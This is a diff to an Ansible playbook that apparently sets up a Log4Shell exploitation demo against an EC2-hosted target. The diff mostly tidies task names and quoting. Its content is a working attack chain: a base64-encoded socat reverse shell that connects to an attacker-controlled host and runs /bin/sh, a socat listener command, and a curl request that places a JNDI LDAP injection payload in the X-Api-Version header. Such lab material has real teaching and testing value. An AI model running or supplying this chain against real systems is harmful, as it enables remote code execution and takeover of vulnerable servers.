@@ -5,11 +5,12 @@
   gather_facts: false
 
   tasks:
-    - name: setup the exploit command
-      shell: "echo 'socat TCP4:{{ ec2_instance.instances.0.public_ip_address }}:10250 EXEC:/bin/sh' | base64"
+    - name: Setup the exploit command
+      ansible.builtin.shell: "echo 'socat TCP4:{{ ec2_instance.instances.0.public_ip_address }}:10250 EXEC:/bin/sh' | base64"
       register: socat
 
-    - debug:
+    - name: Print out environment details
+      ansible.builtin.debug:
         msg: |
           #######################
           # EC2 Instance
@@ -26,4 +27,4 @@
             socat -d -d TCP4-LISTEN:10250,reuseaddr,fork STDOUT
 
           From your local system:
-            curl http://{{ log4shell_route.stdout }} -H "X-Api-Version: ${jndi:ldap://{{ ec2_instance.instances.0.public_ip_address}}:1389/Basic/Command/Base64/{{ socat.stdout_lines }}}"
+            curl http://{{ log4shell_route.stdout }} -H 'X-Api-Version: ${jndi:ldap://{{ ec2_instance.instances.0.public_ip_address}}:1389/Basic/Command/Base64/{{socat.stdout_lines[0]}}}'
